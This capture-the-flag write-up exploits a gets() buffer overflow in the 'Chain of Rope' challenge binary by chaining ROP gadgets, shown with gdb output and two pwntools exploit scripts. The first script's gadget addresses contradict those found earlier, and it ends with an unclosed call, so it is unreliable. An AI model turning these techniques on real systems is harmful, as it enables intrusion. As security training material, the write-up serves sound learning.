## AngstromCTF: Chain of Rope
> defund found out about this cool new dark web browser! While he was browsing the dark web he came across this service that sells rope chains on the black market, but they're super overpriced! He managed to get the source code. Can you get him a rope chain without paying?

##### *tl;dr: chaining rop gadgets*
#### Guessing from the challenge title itself, this challenge will be solved by chaining together rop gadgets found inside the binary to get the flag. For the exploit, it can be done the hard way or the much easier way. I'll discuss the hard way first to have an understading on how to perform a simple rop chain on a 64-bit binary. 
#### Since we have the source code, first thing to do is to examine it:
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int userToken = 0;
int balance = 0;

int authorize () {
	userToken = 0x1337;
	return 0;
}

int addBalance (int pin) {
	if (userToken == 0x1337 && pin == 0xdeadbeef) {
		balance = 0x4242;
	} else {
		printf("ACCESS DENIED\n");
	}
	return 0;
}

int flag (int pin, int secret) {
	if (userToken == 0x1337 && balance == 0x4242 && pin == 0xba5eba11 && secret == 0xbedabb1e) {
		printf("Authenticated to purchase rope chain, sending free flag along with purchase...\n");
		system("/bin/cat flag.txt");
	} else {
		printf("ACCESS DENIED\n");
	}
	return 0;
}

void getInfo () {
	printf("Token: 0x%x\nBalance: 0x%x\n", userToken, balance);
}

int main() {
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	char name [32];
	printf("--== ROPE CHAIN BLACK MARKET ==--\n");
	printf("LIMITED TIME OFFER: Sending free flag along with any purchase.\n");
	printf("What would you like to do?\n");
	printf("1 - Set name\n");
	printf("2 - Get user info\n");
	printf("3 - Grant access\n");
	int choice;
	scanf("%d\n", &choice);
	if (choice == 1) {
		gets(name);
	} else if (choice == 2) {
		getInfo();
	} else if (choice == 3) {
		printf("lmao no\n");
	} else {
		printf("I don't know what you're saying so get out of my black market\n");
	}
	return 0;
}
```
#### From what we can analyze from the code, the entry point for our exploit will be the vulnerable gets call for the name variable when selecting the first user choice then we can proceed to jump to any function we want. But we can't do that, since the function we really need to call, `flag`, has arguments that need to be checked first before it is executed. To do that, we need to jump to the necessary functions, in a particular order, to set the needed variables. So our chain will go something like: `buffer overflow - call authorize to set userToken - call addBalance and provide the pin argument - finally call flag with the needed arguments`
#### It won't be that easy tho, since unlike 32-bit binaries which place the arguments on the stack, 64-bit binaries place arguments on registers - here is where the need for rop gadgets pop in. 
```
$ ROPgadget --binary chain_of_rope
  [...]
  0x00000000004008f3 : pop rdi ; ret
  0x00000000004008f1 : pop rsi ; pop r15 ; ret
```
#### These are the rop gadgets that we need since the functions require two arguments at most and these arguments must be placed into the rdi and rsi registers. Before we proceed to make our exploit, we need to find which offset to control rip. 
```
$ gdb ./chain_of_rope
  gdb-peda$ pattern create 100
  [...]
  
  gdb-peda$ r
  --== ROPE CHAIN BLACK MARKET ==--
  LIMITED TIME OFFER: Sending free flag along with any purchase.
  What would you like to do?
  1 - Set name
  2 - Get user info
  3 - Grant access
  1
  AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

  Program received signal SIGSEGV, Segmentation fault.
  [...]
  
  gdb-peda$ x/wx $rsp
  0x7fffffffddd8:	0x41416341
  
  gdb-peda$ pattern offset 0x41416341
  1094804289 found at offset: 56
```
#### And now that we have what we need, we'll now make the exploit. So what we'll need to do is to overflow the buffer and jump to the authorize function to set the userToken variable, next we use the pop rdi gadget for us to place the pin argument for addBalance into the rdi register, then we use the `pop rdi` and `pop rsi; pop r15` gadgets to place the pin and secret arguments for the flag function, then provide a dummy address for the program to return to (r15) and finally get the flag. Now to craft our exploit:
```python
from pwn import *

#: Connect to chall server
HOST = 'shell.actf.co'
PORT = 19400
binary = ELF('./chain_of_rope')
rop = ROP(binary)
# p = binary.process()
p = remote(HOST,PORT)
print(p.recv())

#: Exploit code
offset = 'A' * 56
authorize = binary.symbols['authorize']
addBalance = binary.symbols['addBalance']
flag = binary.symbols['flag']

#: Gadgets
pop_rdi = p64(0x4008f3)
pop_rsi = p64(0x4008f1)

#: Rop exploit v1
context.clear(arch='amd64')
rop.raw(offset)
rop.raw(p64(authorize))
rop.raw(0x401403)
rop.raw(p64(0xdeadbeef))
rop.raw(p64(addBalance))
rop.raw(0x401403)
rop.raw(p64(0xba5eba11))
rop.raw(0x401401)
rop.raw(p64(0xbedabb1e))
rop.raw(p64(0x0))
rop.raw(p64(flag))
exploit = rop.exploit()

#: Send payload
p.sendline('1')
p.sendline(exploit)
p.interactive(
```
#### And there we have it. But we could also do this through a much simpler approach using rop.calls from pwntools. We only need to call the functions and provide their arguments, pwntools chains it for us. 
```python
#: ROP exploit v2
context.clear(arch='amd64')
rop.call(authorize)
rop.call(addBalance, [0xdeadbeef])
rop.call(flag, [0xba5eba11, 0xbedabb1e])
print(rop.dump())
exploit = offset + rop.chain()
```
#### Running our exploit script, we now get our flag! 
```actf{dark_web_bargains}```
